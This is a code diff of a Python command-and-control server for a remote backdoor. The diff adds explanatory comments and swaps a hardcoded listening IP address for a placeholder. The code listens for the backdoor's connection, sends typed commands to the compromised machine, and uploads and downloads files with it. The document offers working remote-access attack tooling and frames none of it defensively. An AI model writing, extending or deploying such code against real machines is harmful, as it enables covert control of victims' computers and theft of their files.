@@ -3,9 +3,11 @@ import json
 import tqdm
 import os
 import time
+# to send the command to backdoor
 def send1(datasend):
     jsdata = json.dumps(datasend)
     target.send(jsdata.encode())
+# receive output from the backdoor
 def recv():
     data1 =''
     while True:
@@ -14,6 +16,7 @@ def recv():
             return json.loads(data1)
         except ValueError:
             continue
+# To receive files from the backdoor
 def recvf():
     SEPARATOR = "<SEPARATOR>"
     received = target.recv(4096).decode()
@@ -31,8 +34,7 @@ def recvf():
             f.write(bytes_read)
             progress.update(len(bytes_read))
             size1 += len(bytes_read)
-            print(size1, filesize)
-
+#send files to the backdoor
 def sendf(imgpth1):
 
     imgpth = ''.join(imgpth1)
@@ -54,7 +56,7 @@ def sendf(imgpth1):
             # update the progress bar
             progress.update(len(bytes_read))
         print("transmission done")
-
+# to specify what each command should do and call in the server
 def targcom():
     while True:
         command = input(str(ip)+":")
@@ -108,14 +110,14 @@ def targcom():
                 
                 case _:
                     result = recv()
-                    print(result)
                     if "Bye ...." in result:
                         sock.close()
                         exit(0)
         else:
             print("Invalid command")
+#Code to establish and listen for incoming connection
 sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-sock.bind(('68.183.89.11',5555))
+sock.bind(('xx.xxx.xx.xx',xxxx)) # replace the xx.xxx.xx.xx with the ipaddress to connect and xxxx with the port number
 print("Listening for connections")
 sock.listen(5)
 target , ip=sock.accept()
